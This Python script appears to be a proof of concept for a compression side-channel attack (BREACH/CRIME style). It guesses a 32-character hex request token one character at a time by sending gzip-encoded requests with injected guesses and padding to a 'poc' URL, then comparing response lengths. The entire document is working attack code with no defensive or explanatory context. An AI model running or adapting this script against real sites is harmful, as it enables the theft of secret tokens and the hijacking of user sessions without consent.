import urllib.parse
import urllib.request

def sendRequest(url, request, token, payload):
	url = url + token + payload
	request = urllib.request.Request(url)
	request.add_header('User-Agent','Mozilla/5.0 (Windows NT 6.1; Win64; x64)')
	request.add_header('Accept-Encoding','gzip, deflate')
	return request

def getLength(request):
	with urllib.request.urlopen(request) as response:
		server_response = response.read()
		length = len(server_response)
		return length

request = 0
token = ''
length = 32
breaks = "{}{}{}"
smallest_response_length = 100000
index = 0
url = "http://malbot.net/poc/?request_token='"
i = 0
check = True
guess_values = [48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 97, 98, 99, 100, 101] #1-9,a-f in ascii
num = 0

for j in range(length):
	url = "http://malbot.net/poc/?request_token='"
	smallest_response_length = 100000
	check = True

	while check:
		guess = chr(guess_values[i])
		print ("Trying: ", chr(guess_values[i]))
		request = sendRequest(url, request, token, guess + breaks + "'")
		length1 = getLength(request)
		if (length1 <= smallest_response_length):
			if (length1 == smallest_response_length):
				request = sendRequest(url, request, token, breaks + chr(guess_values[index]) + "'")
				length2 = getLength(request)
				if ((length1 - length2) < 0):
					token = token + chr(guess_values[index])
					i = 0
					check = False
				else:
					request = sendRequest(url, request, token, breaks + guess + "'")
					length2 = getLength(request)
					if ((length1 - length2) < 0):
						token = token + guess
						i = 0
						check = False
				num = 1
			if (num == 1 and length1 != smallest_response_length):
				num = 0
			smallest_response_length = length1
			index = i
		i = i + 1

		if (i == len(guess_values) and num == 1 and index != i and length1 == smallest_response_length):
			num = 0
			url = "http://malbot.net/poc/?'"
			i = 0
		if (i == len(guess_values)):
			i = 0
			token = token + chr(guess_values[index])
			check = False
	print (token)